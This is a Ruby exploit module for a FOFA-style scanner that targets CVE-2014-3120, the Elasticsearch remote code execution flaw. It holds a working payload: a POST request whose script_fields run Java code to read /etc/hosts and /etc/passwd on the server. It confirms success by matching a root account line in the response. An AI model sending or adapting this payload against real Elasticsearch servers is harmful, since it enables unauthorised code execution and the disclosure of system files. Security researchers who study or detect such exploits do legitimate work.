require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def initialize(info = {})
    super(
      'Name' => 'CVE-2014-3120 Elastic Search Remote Code Execution',
      'Description' => %q{
This project demonstrates the CVE-2014-3120 vulnerability/misconfiguration.  It allows you to read from and append to files on the system hosting ES, provided the user running ES has access to them.
          },
      'Author' =>
          [
              'LubyRuffy',
          ],
      'Product' => '-',
      'Homepage' => '-',
      'References' =>
          [
              ['CVE', '2014-3120'],
          ],
      'ScanStep' =>
          [
            {
              'Request'=>
                 ['POST',
                   %q|{
                      "size": 1,
                      "query": {
                        "filtered": {
                          "query": {
                            "match_all": {}
                          }
                        }
                      },
                      "script_fields": {
                        "/etc/hosts": {
                          "script": "import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"/etc/hosts\")).useDelimiter(\"\\\\Z\").next();"
                        },
                        "/etc/passwd": {
                          "script": "import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\\\Z\").next();"
                        }
                      }
                    }|
                 ],
              'Response'=> {
                  operation: 'AND',
                  checks: [{
                      operation: 'contains',
                      varibale: '$body',
                      value: 'root:x:0:0:root:/root:/bin/bash'
                  }]
              }
            },
          ]
    )
  end

  def exploit
    vulerable = excute_scanstep
  end
end